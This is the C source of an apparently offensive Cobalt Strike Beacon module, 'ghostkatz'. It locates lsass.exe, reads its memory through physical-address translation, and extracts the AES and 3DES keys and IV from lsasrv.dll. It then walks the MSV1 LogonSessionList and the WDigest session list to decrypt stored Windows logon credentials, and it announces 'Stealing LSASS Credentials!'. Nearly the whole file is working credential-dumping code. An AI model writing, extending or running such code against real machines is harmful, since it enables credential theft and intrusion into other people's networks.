
#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass.h"

DWORD64 GetDataSectionOffset(char* TargetModule)
{
    HMODULE hModule = GetModuleHandleA(TargetModule);
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pImgDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)((BYTE*)pImgNtHdr + sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < pImgNtHdr->FileHeader.NumberOfSections; i++)
    {
        if (strcmp(pImgSectionHdr->Name, ".data") == 0)
        {
            DWORD64 Offset = (DWORD64)pImgSectionHdr->VirtualAddress;
            return Offset;
        }
        pImgSectionHdr = (PIMAGE_SECTION_HEADER)((BYTE*)pImgSectionHdr + sizeof(IMAGE_SECTION_HEADER));
    }

    return 0;
}

DWORD GetTargetProcessInformation(PWSTR TargetProcess)
{
    ULONG len = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &len);

    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        BeaconFormatPrintf(&outputbuffer, "NtQuerySystemInformation failed: 0x%08X\n", status);
        return 0;
    }

    PVOID buffer = NULL;
    int retries = 3;  // Maximum number of retries for buffer size mismatch

    while (retries-- > 0)
    {
        buffer = malloc(len);  // Allocate the buffer with the required size
        if (buffer == NULL)
        {
            BeaconFormatPrintf(&outputbuffer, "Memory allocation failed\n");
            return 0;
        }

        // Make the call to get the process information
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, len, &len);

        if (NT_SUCCESS(status))
        {
            break;
        }

        // If the buffer is still too small, reallocate it with the new size and retry
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            free(buffer);  // Free the previous buffer
            continue;  // Retry with a larger buffer
        }
        else
        {
            // If an unexpected error occurs, print and return NULL
            BeaconFormatPrintf(&outputbuffer, "NtQuerySystemInformation failed: 0x%08X\n", status);
            free(buffer);
            return 0;
        }
    }

    if (retries <= 0)
    {
        // If we exceeded the retry limit, return NULL
        BeaconFormatPrintf(&outputbuffer, "Failed to get process information after multiple attempts\n");
        free(buffer);
        return 0;
    }

    // Process the buffer
    PCUSTOM_SYSTEM_PROCESS_INFORMATION spi = (PCUSTOM_SYSTEM_PROCESS_INFORMATION)buffer;
    while (spi)
    {
        if (spi->ImageName.Buffer && _wcsicmp(TargetProcess, spi->ImageName.Buffer) == 0)
        {
            DWORD TargetProcessId = (DWORD)(spi->UniqueProcessId);
            free(buffer);
            return TargetProcessId;
        }

        if (spi->NextEntryOffset == 0)
            break;

        spi = (PCUSTOM_SYSTEM_PROCESS_INFORMATION)((PUCHAR)spi + spi->NextEntryOffset);
    }

    free(buffer);
    return 0;
}

unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lower32bits, int LsassPID, int* ReturnKeySize)
{
    // .process /p /r ffffde8b85e52140; db poi(poi(lsasrv!hAesKey)+0x10)+0x38
   
    // Check if the PBCRYPT_HANDLE_KEY->tag matches the string "UUUR"
    DWORD64 bCryptHandleKeyPA = 0;
    TranslateUVA2Physical(bCryptHandleKey, &bCryptHandleKeyPA, lower32bits, LsassPID);
    unsigned char* ReadTag = ReadMultipleBytes(hFile, 4, bCryptHandleKeyPA + 4, FALSE);
    if (memcmp(ReadTag, "UUUR", 4) == 0)
    {
        // Get the PBCRYPT_KEY81 address from PBCRYPT_HANDLE_KEY->key member
        DWORD64 pBcryptKey81 = ReadAddressAtPhysicalAddressLocation(hFile, bCryptHandleKeyPA + 0x10);
        DWORD64 BcryptKey81PA = 0;
        TranslateUVA2Physical(pBcryptKey81, &BcryptKey81PA, lower32bits, LsassPID);
        ReadTag = ReadMultipleBytes(hFile, 4, BcryptKey81PA + 4, FALSE);
        if (memcmp(ReadTag, "MSSK", 4) == 0)
        {
            // 0x38 is the hardkey member structure.
            // This structure has the first 4 bytes as the size of the key.
            // The next following bytes are the key
            BYTE KeyLength;
            ReadByte(hFile, BcryptKey81PA + 0x38, &KeyLength);

            if (KeyLength != 0)
            {
                unsigned char* RealDecryptionKey = ReadMultipleBytes(hFile, KeyLength, BcryptKey81PA + 0x38 + 4, TRUE);
                *ReturnKeySize = KeyLength;
                return RealDecryptionKey;
            }
        }
    }
    free(ReadTag);

    return TRUE;
}

BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Stealing LSASS Credentials!\n");

    DWORD LsassPID = GetTargetProcessInformation(L"lsass.exe");
    if (LsassPID == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get LSASS PID!\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Lsass PID: %d\n", LsassPID);

    // Get LSASS EPROCESS address
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Locating LSASS EPROCESS...\n");
    DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber);
    if (LsassEprocessVA == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get LSASS EPROCESS address!\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS EPROCESS VA: 0x%llx\n", LsassEprocessVA);


    DWORD lower32bits = (DWORD)LsassEprocessVA;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for credential keys in lsasrv.dll...\n");

    DWORD64 hAesKeyAddress = 0;
    DWORD64 h3DesKeyAddress = 0;
    DWORD64 IVAddress = 0;

    HMODULE hModule = LoadLibraryA("lsasrv.dll");
    if (!SearchForCredentialKeys(dBuildNumber, &hAesKeyAddress, &h3DesKeyAddress, &IVAddress))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find credential keys!\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found credential key addresses.\n");

    DWORD64 hAesKeyPhysicalAddress = 0;
    if (!TranslateUVA2Physical(hAesKeyAddress, &hAesKeyPhysicalAddress, lower32bits, LsassPID))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] AES Key has invalid address!\n");
        return FALSE;
    }

    DWORD64 h3DesKeyPhysicalAddress = 0;
    if (!TranslateUVA2Physical(h3DesKeyAddress, &h3DesKeyPhysicalAddress, lower32bits, LsassPID))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] 3DES Key has invalid address!\n");
        return FALSE;
    }

    DWORD64 IVPhysicalAddress = 0;
    if (!TranslateUVA2Physical(IVAddress, &IVPhysicalAddress, lower32bits, LsassPID))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] IV has invalid address!\n");
        return FALSE;
    }


    // The addresses we have above are pointers to the PBCRYPT_HANDLE_KEY
    // Get the PBCRYPT_HANDLE_KEY virtual address by dereferencing the keys variables and then traverse the struct to get their actual key values
    int iAesKeyLength = 0;
    DWORD64 hAesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, hAesKeyPhysicalAddress);
    unsigned char* RealAesKey = RetrieveBCryptKey(hFile, hAesBCryptHandleKey, lower32bits, LsassPID, &iAesKeyLength);

    int i3DesKeyLength = 0;
    DWORD64 h3DesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, h3DesKeyPhysicalAddress);
    unsigned char* Real3DesKey = RetrieveBCryptKey(hFile, h3DesBCryptHandleKey, lower32bits, LsassPID, &i3DesKeyLength);

    unsigned char* InitializationVector = ReadMultipleBytes(hFile, 8, IVPhysicalAddress, TRUE);

    BeaconFormatPrintf(&outputbuffer, "[i] hAesKey: 0x%llx\n", hAesBCryptHandleKey);
    BeaconFormatPrintf(&outputbuffer, "\t-> Real AES Key: ");
    PrintHex(RealAesKey, iAesKeyLength);

    BeaconFormatPrintf(&outputbuffer, "[i] h3DesKey: 0x%llx\n", h3DesBCryptHandleKey);
    BeaconFormatPrintf(&outputbuffer, "\t-> Real 3Des Key: ");
    PrintHex(Real3DesKey, i3DesKeyLength);

    BeaconFormatPrintf(&outputbuffer, "[i] IV: 0x%llx\n", InitializationVector);
    BeaconFormatPrintf(&outputbuffer, "\t-> Real IV Value: ");
    PrintHex(InitializationVector, 8);
    BeaconFormatPrintf(&outputbuffer, "\n");


    if (RetrieveMSV1Credentials)
    {
        // lsasrv!LogonSessionList Information
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for LogonSessionList...\n");
        DWORD64 DataSectionOffset = GetDataSectionOffset("lsasrv.dll");
        DWORD64 ImageStartAddress = GetModuleHandleA("lsasrv.dll");
        DWORD64 DataSectionBase = ImageStartAddress + DataSectionOffset;
        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress, dBuildNumber);
        if (LogonSessionListHead == 0)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to obtain LogonSessionList!\n");
            return FALSE;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LogonSessionList found: 0x%llx\n", LogonSessionListHead);
        
        BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
        BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionListBase: 0x%llx\n\n", LogonSessionListHead);

        // lsasrv!LogonSessionList is an array of 32 LIST_ENTRY heads (one per auth type).
        // Iterate all 32 sub-lists; empty ones are skipped automatically.
        for (int li = 0; li < 32; li++)
        {
            DWORD64 SubListHead = LogonSessionListHead + (DWORD64)li * 0x10;
            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
        }
        FreeLibrary(hModule);
    }

    if (RetrieveWDigestCredentials)
    {
        // wdigest!l_LogSessList Information
        HMODULE hWDModule = LoadLibraryA("wdigest.dll");

        DWORD64 l_LogSessListHead = SearchForLogSessList();
        if (l_LogSessListHead == -1)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get the l_LogSessList address!\n");
            FreeLibrary(hWDModule);
            FreeLibrary(hModule);
            return FALSE;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] l_LogSessList: 0x%llx\n", l_LogSessListHead);

        DWORD64 tmpPA = 0;
        if (!TranslateUVA2Physical(l_LogSessListHead, &tmpPA, lower32bits, LsassPID))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] l_LogSessList not yet mapped — authentication must occur first.\n");
            FreeLibrary(hWDModule);
            FreeLibrary(hModule);
            return FALSE;
        }

        DisplayWDigestLogSessListInformation(hFile, l_LogSessListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);

        FreeLibrary(hWDModule);
        FreeLibrary(hModule);
    }

    // -----------------------------------------------------

    return TRUE;
}
